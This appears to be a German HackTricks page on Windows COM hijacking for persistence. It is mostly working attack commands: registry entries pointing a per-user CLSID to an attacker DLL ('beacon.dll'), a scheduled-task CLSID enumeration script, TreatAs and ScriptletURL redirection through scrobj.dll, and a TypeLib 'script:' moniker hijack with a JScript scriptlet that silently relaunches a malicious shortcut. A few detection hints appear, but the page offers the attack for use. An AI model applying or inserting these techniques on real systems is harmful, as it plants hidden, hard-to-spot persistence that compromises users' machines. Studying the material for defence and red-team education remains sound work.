# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Suchen nach nicht vorhandenen COM-Komponenten

Da die Werte von HKCU von Benutzern geändert werden können, könnte **COM Hijacking** als **Persistenzmechanismus** verwendet werden. Mit `procmon` lassen sich gesuchte COM-Registrierungsschlüssel, die noch nicht existieren und von einem Angreifer erstellt werden könnten, leicht finden. Klassische Filter:

- **RegOpenKey**-Operationen.
- bei denen das _Result_ **NAME NOT FOUND** lautet.
- und deren _Path_ mit **InprocServer32** endet.

Nützliche Varianten bei der Suche:

- Suche auch nach fehlenden **`LocalServer32`**-Schlüsseln. Einige COM-Klassen sind Out-of-Process-Server und starten statt einer DLL eine vom Angreifer kontrollierte EXE.
- Suche zusätzlich zu `InprocServer32` nach Registrierungsoperationen für **`TreatAs`** und **`ScriptletURL`**. Aktuelle Detection-Inhalte und Malware-Analysen weisen regelmäßig darauf hin, da diese deutlich seltener als normale COM-Registrierungen sind und daher ein starkes Signal darstellen.
- Übernimm beim Klonen einer Registrierung nach HKCU das legitime **`ThreadingModel`** aus dem ursprünglichen `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Die Verwendung des falschen Modells führt häufig dazu, dass die Aktivierung fehlschlägt und der Hijack auffällig wird.<sup>[[3]](#references)</sup>
- Untersuche auf 64-Bit-Systemen sowohl die 64-Bit- als auch die 32-Bit-Ansichten (`procmon.exe` gegenüber `procmon64.exe`, `HKLM\Software\Classes` und `HKLM\Software\Classes\WOW6432Node`), da 32-Bit-Anwendungen möglicherweise eine andere COM-Registrierung auflösen.

Nachdem du entschieden hast, welches nicht vorhandene COM du imitieren möchtest, führe die folgenden Befehle aus. _Sei vorsichtig, wenn du ein COM imitieren möchtest, das alle paar Sekunden geladen wird, da dies übertrieben sein könnte._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackbare Task-Scheduler-COM-Komponenten

Windows Tasks verwenden Custom Triggers, um COM-Objekte aufzurufen. Da sie über den Task Scheduler ausgeführt werden, lässt sich leichter vorhersagen, wann sie ausgelöst werden.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Anhand der Ausgabe kannst du beispielsweise einen auswählen, der **jedes Mal ausgeführt wird, wenn sich ein Benutzer anmeldet**.

Wenn du nun nach der CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** sowie in HKLM und HKCU suchst, wirst du normalerweise feststellen, dass der Wert in HKCU nicht existiert.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Dann kannst du einfach den HKCU-Eintrag erstellen, und jedes Mal, wenn sich der Benutzer anmeldet, wird deine backdoor ausgeführt.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` ermöglicht, dass ein CLSID durch ein anderes emuliert wird.<sup>[[4]](#references)</sup> Aus offensiver Perspektive bedeutet dies, dass du die ursprüngliche CLSID unverändert lassen, eine zweite CLSID pro Benutzer erstellen kannst, die auf `scrobj.dll` verweist, und anschließend das echte COM-Objekt mit `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` auf das bösartige Objekt umleitest.

Dies ist nützlich, wenn:

- die Zielanwendung bereits beim Anmelden oder beim Start der Anwendung eine stabile CLSID instanziiert
- du eine Registry-only-Umleitung möchtest, anstatt den ursprünglichen `InprocServer32` zu ersetzen
- du ein lokales oder entferntes `.sct`-Scriptlet über den Wert `ScriptletURL` ausführen möchtest

Beispiel-Workflow (angepasst an öffentliches Atomic Red Team tradecraft und ältere Forschung zum Missbrauch der COM-Registry):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Hinweise:

- `scrobj.dll` liest den Wert `ScriptletURL` und führt die referenzierte `.sct` aus. Daher kann die Payload als lokale Datei gespeichert oder per HTTP/HTTPS remote abgerufen werden.
- `TreatAs` ist besonders praktisch, wenn die ursprüngliche COM-Registrierung in HKLM vollständig und stabil ist, da du statt des gesamten Baums nur eine kleine benutzerspezifische Weiterleitung benötigst.
- Zur Validierung, ohne auf den natürlichen Trigger zu warten, kannst du die gefälschte ProgID/CLSID manuell mit `rundll32.exe -sta <ProgID-or-CLSID>` instanziieren, sofern die Zielklasse die STA-Aktivierung unterstützt.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definieren COM-Schnittstellen und werden über `LoadTypeLib()` geladen. Wenn ein COM-Server instanziiert wird, lädt das Betriebssystem möglicherweise auch die zugehörige TypeLib, indem es die Registrierungsschlüssel unter `HKCR\TypeLib\{LIBID}` abfragt. Wird der TypeLib-Pfad durch einen **Moniker** ersetzt, z. B. `script:C:\...\evil.sct`, führt Windows das Scriptlet auf, sobald die TypeLib aufgelöst wird – dadurch entsteht eine unauffällige Persistence, die ausgelöst wird, wenn häufig verwendete Komponenten angesprochen werden.

Dies wurde beim Microsoft Web Browser Control beobachtet, das häufig vom Internet Explorer, von Apps mit eingebettetem WebBrowser und sogar von `explorer.exe` geladen wird.<sup>[[1]](#references)[[2]](#references)</sup>

### Schritte (PowerShell)

1) Ermittle die TypeLib (LIBID), die von einer CLSID mit hoher Zugriffshäufigkeit verwendet wird. Beispiel für eine CLSID, die häufig in Malware-Ketten missbraucht wird: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Setze den benutzerspezifischen TypeLib-Pfad mithilfe des `script:`-Monikers auf ein lokales Scriptlet (keine Administratorrechte erforderlich):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Lege ein minimales JScript-`.sct` ab, das deinen primären Payload erneut startet (z. B. eine `.lnk`, die von der initialen Chain verwendet wird):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Auslösen – das Öffnen von IE, einer Anwendung, die das WebBrowser control einbettet, oder sogar routinemäßige Explorer-Aktivitäten lädt die TypeLib und führt das scriptlet aus, wodurch deine chain bei der Anmeldung/einem Neustart erneut aktiviert wird.

Bereinigung
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notizen
- Du kannst dieselbe Logik auf andere häufig verwendete COM-Komponenten anwenden; löse die echte `LIBID` immer zuerst aus `HKCR\CLSID\{CLSID}\TypeLib` auf.
- Auf 64-Bit-Systemen kannst du außerdem den Unterschlüssel `win64` für 64-Bit-Consumer anlegen.

## Referenzen

- [1] [Hijack the TypeLib – Neue COM-Persistence-Technik (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine-Kampagne: Ein ausgefeilter Phishing-Angriff auf US-Unternehmen](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [COM Hijacking erneut betrachtet (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID-Schlüssel (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
